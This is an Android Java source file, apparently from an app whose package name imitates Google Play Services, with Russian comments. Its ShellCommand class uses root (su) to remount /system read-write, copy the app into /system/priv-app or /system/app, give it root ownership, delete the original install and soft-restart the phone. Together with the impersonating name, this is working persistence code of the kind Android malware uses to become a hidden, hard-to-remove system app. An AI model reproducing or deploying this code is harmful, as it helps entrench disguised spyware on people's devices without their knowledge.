package com.google.android.gms.persistent.googleapps.utils;

import android.os.Build;
import android.util.Log;

import java.io.IOException;

/**
 * Created by OldMan on 06.07.2017.
 */

public class ShellCommand {

    private static final String TAG = ShellCommand.class.getSimpleName();
    private static final String appName = "com.google.android.gms.persistent.googleapps";

    static public boolean runCommandWait(String cmd, boolean needsu) {
        try {
            String su = "sh";
            if (needsu) { su = "su"; }

            Process process = Runtime.getRuntime().exec(new String[]{su, "-c", cmd});
            int result = process.waitFor();

            return (result == 0);

        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
    static public void makeAppSystem() {
        String systemPrivAppDir = "/system/priv-app/";
        String systemAppDir = "/system/app/";

        String appPath = "/data/app/" + appName;

        // Подключаем /system в режиме чтения-записи
        if (!runCommandWait("mount -o remount,rw /system", true)) {
            Log.e(TAG, "makeAppSystem: Can't mount /system");
            return;
        }

        int api = Build.VERSION.SDK_INT;
        String appDir = systemPrivAppDir;

        // Копиpуем приложение в /system/priv-app или /system/app в зависимости от версии Android
        if (api >= 21) {
            runCommandWait("cp -R " + appPath + "* " + appDir, true);
            runCommandWait("chown -R 0:0 " + appDir + appName + "*", true);
            runCommandWait("rm -Rf " + appPath + "*", true);
        } else {
            if (api < 20) { appDir = systemAppDir; }
            runCommandWait("cp " + appPath + "* " + appDir, true);
            runCommandWait("chown 0:0 " + appDir + appName + "*", true);
            runCommandWait("rm -f " + appPath + "*", true);
        }

        // Отправляем смартфон в мягкую пeрезагрузку
        Shell.runCommand("am restart", true);
    }

}
